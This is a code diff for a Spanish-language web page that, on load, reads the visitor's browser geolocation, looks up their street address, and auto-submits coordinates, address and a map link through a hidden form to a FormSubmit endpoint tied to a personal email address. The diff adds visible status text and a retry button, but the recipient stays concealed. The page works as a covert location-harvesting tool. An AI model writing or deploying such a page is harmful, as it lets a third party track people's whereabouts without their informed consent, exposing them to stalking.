@@ -2,22 +2,62 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Ubicación automática</title>
+  <title>Ubicación detectada</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eef2f3;
+      padding: 30px;
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+    }
+    .dato {
+      margin: 10px 0;
+      font-size: 1.1em;
+      color: #444;
+    }
+    .enlace {
+      margin-top: 15px;
+      font-size: 1.1em;
+      color: #0077cc;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1em;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005fa3;
+    }
+  </style>
   <script>
     async function enviarUbicacion() {
-      if (localStorage.getItem("ubicacionEnviada")) return;
-
-      if (!navigator.geolocation) {
-        alert("La geolocalización no está disponible.");
+      if (localStorage.getItem("ubicacionEnviada")) {
+        document.getElementById("estado").textContent = "✅ Ubicación ya enviada.";
         return;
       }
+
+      if (!navigator.geolocation) {
+        document.getElementById("estado").textContent = "❌ Geolocalización no disponible.";
+        return;
+      }
+
+      document.getElementById("estado").textContent = "📡 Obteniendo ubicación...";
 
       navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        document.getElementById("latitudInput").value = lat;
-        document.getElementById("longitudInput").value = lon;
+        document.getElementById("latitud").textContent = lat;
+        document.getElementById("longitud").textContent = lon;
 
         const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
         try {
@@ -25,23 +65,46 @@
           const data = await response.json();
           const direccion = data.display_name || "Dirección no disponible";
 
+          document.getElementById("direccion").textContent = direccion;
+          const mapaURL = `https://www.google.com/maps?q=${lat},${lon}`;
+          document.getElementById("mapa").href = mapaURL;
+          document.getElementById("mapa").textContent = "📍 Ver en Google Maps";
+
+          // Enviar por FormSubmit
+          document.getElementById("latitudInput").value = lat;
+          document.getElementById("longitudInput").value = lon;
           document.getElementById("direccionInput").value = direccion;
-          document.getElementById("mapaInput").value = `https://www.google.com/maps?q=${lat},${lon}`;
+          document.getElementById("mapaInput").value = mapaURL;
 
           localStorage.setItem("ubicacionEnviada", "true");
+          document.getElementById("estado").textContent = "✅ Ubicación enviada correctamente.";
           document.getElementById("formulario").submit();
         } catch (error) {
-          alert("Error al obtener la dirección.");
+          document.getElementById("estado").textContent = "❌ Error al obtener la dirección.";
         }
-      }, (error) => {
-        alert("No se pudo obtener la ubicación.");
+      }, () => {
+        document.getElementById("estado").textContent = "❌ No se pudo obtener la ubicación.";
       });
+    }
+
+    function reiniciarEnvio() {
+      localStorage.removeItem("ubicacionEnviada");
+      location.reload();
     }
 
     window.onload = enviarUbicacion;
   </script>
 </head>
 <body>
+  <h1>📍 Tu ubicación detectada</h1>
+  <div id="estado" class="dato">Cargando...</div>
+  <div class="dato">Latitud: <span id="latitud">-</span></div>
+  <div class="dato">Longitud: <span id="longitud">-</span></div>
+  <div class="dato">Dirección: <span id="direccion">-</span></div>
+  <div class="enlace"><a id="mapa" href="#" target="_blank"></a></div>
+
+  <button onclick="reiniciarEnvio()">🔄 Reintentar envío</button>
+
   <form action="https://formsubmit.co/elsanchezok@yahoo.com" method="POST" id="formulario" style="display:none;">
     <input type="hidden" name="Latitud" id="latitudInput">
     <input type="hidden" name="Longitud" id="longitudInput">
